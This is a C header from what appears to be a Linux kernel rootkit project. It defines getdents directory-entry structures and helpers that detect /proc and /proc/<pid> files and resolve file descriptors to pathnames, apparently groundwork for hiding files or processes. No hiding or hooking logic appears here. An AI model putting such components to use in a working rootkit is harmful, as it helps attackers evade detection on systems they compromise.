#ifndef _ROOTKIT_FILES_H_
#define _ROOTKIT_FILES_H_

#include "macro_utils.h"
#include <linux/types.h>
// types.h is required for dirent.h, so we include it before
#include <linux/dcache.h>
#include <linux/dirent.h>
#include <linux/fdtable.h>
#include <linux/fs.h>
#include <linux/magic.h>
#include <linux/path.h>

/**
 * Structure representing a directory entry (legacy; deprecated and removed from the kernel).
 * This is used to parse the output of the `getdents` syscall.
 */
typedef struct linux_dirent {
    unsigned long d_ino;     // Inode number
    unsigned long d_off;     // Offset to next linux_dirent
    unsigned short d_reclen; // Length of this linux_dirent
    char d_name[];           // Filename (null-terminated)
} dirent_t;

typedef struct linux_dirent64 dirent64_t;

typedef struct file file_t;
typedef struct path path_t;
typedef struct inode inode_t;
typedef struct dentry dentry_t;
typedef struct files_struct files_t;

/**
 * Is the given file structure the root of a filesystem?
 *
 * @param p_file The file structure
 * @return `true` if the given file structure is the root of a filesystem, `false` otherwise
 */
static inline bool is_file_root(const file_t *const p_file)
{
    IF_U (p_file == NULL) {
        return false;
    }

    return IS_ROOT(p_file->f_path.dentry);
}

/**
 * Is the given file structure in a `proc` filesystem?
 *
 * @param p_file The file structure
 * @return `true` if the given file structure is in a proc filesystem, `false` otherwise
 */
static inline bool is_in_proc(const file_t *const p_file)
{
    const inode_t *p_inode = NULL; // Inode structure

    IF_U (p_file == NULL) {
        return false;
    }

    p_inode = file_inode(p_file);
    IF_U (p_inode == NULL) {
        return false;
    }

    return p_inode->i_sb->s_magic == PROC_SUPER_MAGIC;
}

/**
 * Is the given file structure the root of a `proc` filesystem?
 *
 * @param p_file The file structure
 * @return `true` if the given file structure is the root of a proc filesystem, `false` otherwise
 */
static inline bool is_proc_root(const file_t *const p_file)
{
    IF_U (p_file == NULL) {
        return false;
    }

    return is_file_root(p_file) && is_in_proc(p_file);
}

/**
 * Is the parent of the given file structure the root of a `proc` filesystem?
 *
 * @param p_file The file structure
 * @return `true` if the parent of the given file structure is the root of a proc filesystem,
 * `false` otherwise
 */
static inline bool is_parent_proc_root(const file_t *const p_file)
{
    const dentry_t *p_parent = NULL; // Parent dentry structure

    IF_U (p_file == NULL) {
        return false;
    }

    p_parent = p_file->f_path.dentry->d_parent;

    return IS_ROOT(p_parent) && is_in_proc(p_file);
}

/**
 * Is the given file structure a strict descendant of the root of a `proc` filesystem?
 *
 * @param p_file The file structure
 * @return `true` if the given file structure is a strict descendant of the root of a proc
 * filesystem, `false` otherwise
 */
static inline bool is_proc_descendant(const file_t *const p_file)
{
    IF_U (p_file == NULL) {
        return false;
    }

    return !is_file_root(p_file) && is_in_proc(p_file);
}

/**
 * Is the given file structure /proc/<pid> or one of its descendants?
 * This is used to determine if a file structure is a process file.
 *
 * @param p_file The file structure
 * @param i32_pid The PID
 * @return `true` if the given file structure is a descendant of /proc/<pid>, `false` otherwise
 */
bool is_proc_pid_descendant(const file_t *const p_file, const int32_t i32_pid);

/**
 * Gets the file structure associated with the given file descriptor.
 *
 * @param d_fd The file descriptor
 * @return The file structure associated with the given file descriptor
 */
const file_t *fd_get_file(const int d_fd);

/**
 * Gets the pathname of the given file.
 * The returned string must be freed with `kfree`/`kvfree`.
 *
 * @param p_file The file
 * @return The pathname of the given file
 */
const char *file_get_pathname(const file_t *const p_file);

/**
 * Gets the pathname of the file associated with the given file descriptor.
 * The returned string must be freed with `kfree`/`kvfree`.
 *
 * @param d_fd The file descriptor
 * @return The pathname of the file associated with the given file descriptor
 */
const char *fd_get_pathname(const int d_fd);

#endif
